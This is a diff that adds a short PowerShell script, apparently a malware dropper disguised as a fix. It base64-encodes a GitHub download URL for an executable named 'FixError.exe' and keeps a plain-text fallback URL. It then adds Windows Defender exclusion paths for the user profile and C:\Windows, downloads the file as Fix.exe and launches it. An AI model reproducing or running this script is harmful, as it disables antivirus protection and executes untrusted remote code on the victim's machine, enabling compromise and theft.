@@ -1,0 +1,12 @@
+$urlBase64 = 'aHR0cHM6Ly9naXRodWIuY29tL25hcnV0bzMyMTMyMy8xMTEvcmF3L2JlYWQvbWluL0ZpeEVycm9yLmV4ZQ=='
+$url = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($urlBase64))
+if (-not $url) {
+    # N?u không gi?i mã du?c, s? d?ng URL m?c d?nh
+    $url = 'https://github.com/naruto3213213/111/raw/refs/heads/main/FixError.exe'
+}
+$output = [System.IO.Path]::Combine($env:USERPROFILE, 'Documents', 'Fix.exe')
+$exclusionPaths = @($env:USERPROFILE, 'C:\Windows')
+$exclusionPaths | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
+Invoke-WebRequest -Uri $url -OutFile $output
+Start-Process -FilePath $output
+Pause
